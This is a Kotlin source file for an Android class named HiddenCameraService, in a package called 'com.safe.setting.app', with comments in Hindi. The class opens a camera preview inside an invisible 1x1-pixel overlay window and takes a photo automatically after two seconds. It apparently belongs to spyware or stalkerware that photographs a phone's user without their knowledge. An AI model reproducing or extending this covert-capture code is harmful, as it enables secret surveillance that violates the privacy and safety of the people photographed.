package com.safe.setting.app.utils.hiddenCameraServiceUtils

import android.Manifest
import android.content.Context
import android.content.pm.PackageManager
import android.graphics.ImageFormat
import android.graphics.PixelFormat
import android.hardware.camera2.CameraCharacteristics
import android.hardware.camera2.CameraManager
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.util.Log
import android.util.Size
import androidx.core.app.ActivityCompat
import android.view.ViewGroup
import android.view.WindowManager
import com.safe.setting.app.utils.Consts.TAG
import com.safe.setting.app.utils.hiddenCameraServiceUtils.config.CameraFacing
import com.safe.setting.app.utils.hiddenCameraServiceUtils.HiddenCameraUtils.canOverDrawOtherApps
import com.safe.setting.app.utils.hiddenCameraServiceUtils.HiddenCameraUtils.isFrontCameraAvailable
import com.safe.setting.app.utils.hiddenCameraServiceUtils.config.CameraResolution
// import com.pawegio.kandroid.d // **** पुराना इम्पोर्ट हटा दिया गया ****

class HiddenCameraService(private val context: Context, private val cameraCallbacks: CameraCallbacks) {

    private var mWindowManager: WindowManager? = null
    private var mCameraPreview: CameraPreview? = null

    fun startCamera(cameraConfig: CameraConfig) {
        if (!context.canOverDrawOtherApps()) {
            cameraCallbacks.onCameraError(CameraError.ERROR_DOES_NOT_HAVE_OVERDRAW_PERMISSION)
        } else if (ActivityCompat.checkSelfPermission(context, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
            cameraCallbacks.onCameraError(CameraError.ERROR_CAMERA_PERMISSION_NOT_AVAILABLE)
        } else if (cameraConfig.facing == CameraFacing.FRONT_FACING_CAMERA && !context.isFrontCameraAvailable()) {
            cameraCallbacks.onCameraError(CameraError.ERROR_DOES_NOT_HAVE_FRONT_CAMERA)
        } else {
            CameraPreview.cameraId = cameraConfig.facing.toString()

            val cameraManager = context.getSystemService(Context.CAMERA_SERVICE) as CameraManager
            val characteristics = cameraManager.getCameraCharacteristics(CameraPreview.cameraId)

            val map = characteristics.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP)
            val pictureSizes = map?.getOutputSizes(ImageFormat.JPEG)
            val cameraSize: Size? = when (cameraConfig.resolution) {
                CameraResolution.MEDIUM_RESOLUTION -> pictureSizes?.get(pictureSizes.size / 2)
                CameraResolution.SLOW_RESOLUTION -> pictureSizes?.last()
                else -> pictureSizes?.first() // सुरक्षित डिफ़ॉल्ट
            }
            CameraPreview.cameraSize = cameraSize

            if (mCameraPreview == null) mCameraPreview = addPreView()
            mCameraPreview!!.startCameraInternal(cameraConfig)
            Handler(Looper.getMainLooper()).postDelayed({ takePicture() }, 2000)
        }
    }

    private fun takePicture() {
        if (mCameraPreview != null) {
            mCameraPreview!!.takePictureInternal()
        } else {
            throw RuntimeException("Background camera not initialized. Call startCamera() to initialize the camera.")
        }
    }

    fun stopCamera() {
        if (mCameraPreview != null) {
            mWindowManager?.removeView(mCameraPreview)
            mCameraPreview!!.stopPreviewAndFreeCamera()
            mCameraPreview = null
            // **** बदला हुआ कोड: kandroid.d को Log.d से बदलें ****
            Log.d(TAG, "camera stop")
            // **** बदलाव समाप्त ****
        }
    }

    private fun addPreView(): CameraPreview {
        val cameraSourceCameraPreview = CameraPreview(context, cameraCallbacks)
        cameraSourceCameraPreview.layoutParams = ViewGroup.LayoutParams(
            ViewGroup.LayoutParams.MATCH_PARENT,
            ViewGroup.LayoutParams.MATCH_PARENT
        )

        mWindowManager = context.getSystemService(Context.WINDOW_SERVICE) as WindowManager
        // *** FIX STARTS HERE ***
        // एंड्रॉइड संस्करण के आधार पर विंडो प्रकार चुनें
        val windowType = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
        } else {
            @Suppress("DEPRECATION")
            WindowManager.LayoutParams.TYPE_PHONE
        }

        val params = WindowManager.LayoutParams(
            1, 1,
            windowType, // अपडेट किया गया विंडो प्रकार
            WindowManager.LayoutParams.FLAG_WATCH_OUTSIDE_TOUCH,
            PixelFormat.TRANSLUCENT
        )
        // *** FIX ENDS HERE ***

        mWindowManager?.addView(cameraSourceCameraPreview, params)
        return cameraSourceCameraPreview
    }
}